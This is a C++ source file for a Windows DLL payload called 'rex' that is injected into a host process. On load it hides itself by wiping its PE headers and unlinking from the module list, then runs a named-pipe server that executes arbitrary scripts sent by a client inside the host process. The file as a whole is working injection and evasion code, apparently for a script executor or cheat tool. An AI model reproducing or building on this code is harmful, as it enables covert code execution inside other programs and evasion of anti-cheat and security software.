// src/payload/dllmain.cpp
// C++20 | Windows 11 | MSVC
#include <windows.h>
#include <string>
#include "../common/pipe.hpp"
#include "script_runner.hpp"
#include "evasion.hpp"

static bool g_running = true;

static void write_log(const char* msg) {
    char path[MAX_PATH]{};
    if (!GetModuleFileNameA(nullptr, path, MAX_PATH)) return;
    std::string logpath = path;
    size_t pos = logpath.find_last_of("\\/");
    if (pos != std::string::npos) logpath = logpath.substr(0, pos + 1);
    logpath += "rex_payload.log";

    HANDLE h = CreateFileA(logpath.c_str(), GENERIC_WRITE, FILE_SHARE_READ,
                           nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w;
    WriteFile(h, msg, (DWORD)strlen(msg), &w, nullptr);
    WriteFile(h, "\r\n", 2, &w, nullptr);
    CloseHandle(h);
}

static DWORD WINAPI server_thread(LPVOID) {
    write_log("server_thread started");

    rex::evasion::delayed_init([] {
        write_log("delayed_init fired");

        rex::PipeServer server;
        if (!server.create()) {
            write_log("CreateNamedPipe failed");
            return;
        }
        write_log("pipe created – waiting for client");

        if (!server.wait_client()) {
            write_log("wait_client failed");
            return;
        }
        write_log("client connected");

        rex::ScriptRunner runner;
        runner.attach();

        while (g_running) {
            auto pkt = server.read_packet();
            if (!pkt) break;

            switch (pkt->first) {
            case rex::Cmd::Ping:
                server.write_packet(rex::Cmd::Status, "pong", 4);
                break;
            case rex::Cmd::Execute: {
                std::string src(pkt->second.begin(), pkt->second.end());
                auto result = runner.execute(src);
                server.write_packet(rex::Cmd::Status, result.data(),
                                   (uint32_t)result.size());
                break;
            }
            case rex::Cmd::IsAttached: {
                const char* msg = runner.is_attached() ? "1" : "0";
                server.write_packet(rex::Cmd::Status, msg, 1);
                break;
            }
            case rex::Cmd::Unload:
            case rex::Cmd::Shutdown:
                g_running = false;
                break;
            default:
                break;
            }
        }
        write_log("server loop exited");
    });
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        write_log("DllMain PROCESS_ATTACH");
        DisableThreadLibraryCalls(hModule);

        // Hide ourselves as early as possible
        rex::evasion::wipe_headers(hModule);
        rex::evasion::unlink_module(hModule);

        HANDLE h = CreateThread(nullptr, 0, server_thread, nullptr, 0, nullptr);
        if (h) CloseHandle(h);
        else write_log("CreateThread failed");
    }
    else if (reason == DLL_PROCESS_DETACH) {
        g_running = false;
    }
    return TRUE;
}
